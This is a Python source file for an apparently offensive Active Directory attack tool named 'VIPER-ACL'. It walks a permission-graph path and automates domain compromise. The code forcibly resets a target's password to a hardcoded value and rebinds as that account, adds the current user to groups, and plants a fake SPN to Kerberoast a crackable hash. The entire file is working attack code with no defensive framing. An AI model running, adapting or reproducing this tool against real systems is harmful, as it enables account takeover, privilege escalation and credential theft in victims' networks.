class TaskManager:
    def __init__(self, exploit_engine):
        self.engine = exploit_engine
        self.task_queue = []
        self.current_user_dn = exploit_engine.conn.user
        self.current_password = None

    def set_initial_password(self, password):
        self.current_password = password

    def build_plan(self, path_results):
        path = path_results[0]['p']
        for rel in path.relationships:
            edge_type = rel.type
            target_dn = rel.end_node['distinguishedname']
            target_name = rel.end_node['name']
            
            # Map edges with detailed descriptions
            if edge_type == "ForceChangePassword":
                self.task_queue.append({
                    "action": self.engine.force_change_password,
                    "args": (target_dn, "ViperStrike2026!"),
                    "name": "ACCOUNT_TAKEOVER",
                    "desc": f"Resetting password for {target_name}",
                    "rebind": (target_dn, "ViperStrike2026!")
                })
            elif edge_type == "GenericWrite":
                self.task_queue.append({
                    "action": self.engine.add_group_member,
                    "args": (target_dn, None), # Placeholder for context user
                    "name": "GROUP_ESCALATION",
                    "desc": f"Adding current context to group {target_name}"
                })
            elif edge_type == "GenericAll":
                self.task_queue.append({
                    "action": self.engine.set_fake_spn,
                    "args": (target_dn, "viper/roasted"),
                    "name": "TARGETED_KERBEROAST",
                    "desc": f"Setting SPN on {target_name} for hash extraction"
                })
                self.task_queue.append({
                    "action": self.engine.request_kerberoast_hash,
                    "args": (target_name, "viper/roasted"),
                    "name": "HASH_EXTRACTION",
                    "desc": "Requesting TGS ticket to dump crackable hash"
                })

    def execute_all(self):
        total_steps = len(self.task_queue)
        print(f"\n{'='*70}")
        print(f" VIPER-ACL MISSION START: {total_steps} STEPS TO DOMAIN COMPROMISE")
        print(f"{'='*70}")

        for i, task in enumerate(self.task_queue, 1):
            print(f"\n[PHASE {i}/{total_steps}] {task['name']}")
            print(f"  [>] INITIATING: {task['desc']}")
            
            # Context handling for group additions
            args = list(task['args'])
            if task['name'] == "GROUP_ESCALATION" and args[1] is None:
                args[1] = self.current_user_dn
            if task['name'] == "HASH_EXTRACTION":
                args.append(self.current_password)

            # EXECUTE ACTION
            success = task['action'](*args)
            
            if success:
                print(f"  [+] COMPLETED: Action successful.")
                
                # Context switch (rebind) logic
                if "rebind" in task:
                    new_dn, new_pw = task['rebind']
                    print(f"  [*] RE-BINDING: Switching identity to {new_dn}...")
                    self.current_password = task['rebind'][1]
                    self.engine.conn.rebind(user=task['rebind'][0], password=self.current_password)
                    if self.engine.conn.rebind(user=new_dn, password=new_pw):
                        self.current_user_dn = new_dn
                        print(f"  [+] SUCCESS: Context updated.")
                    else:
                        print(f"  [!] CRITICAL: Re-bind failed. Aborting.")
                        break
            else:
                # ERROR LOGGING
                result = self.engine.conn.result
                print(f"  [!] FAILED: {task['name']}")
                print(f"  [!] LDAP ERROR: {result.get('description', 'Unknown')}")
                print(f"  [!] DIAGNOSTIC: {result.get('message', 'No detail provided')}")
                print(f"\n{'!'*70}")
                print(" MISSION ABORTED: Check diagnostic logs above.")
                print(f"{'!'*70}")
                break
        
        if success:
            print(f"\n{'='*70}")
            print(" MISSION ACCOMPLISHED: Final target achieved.")
            print(f"{'='*70}")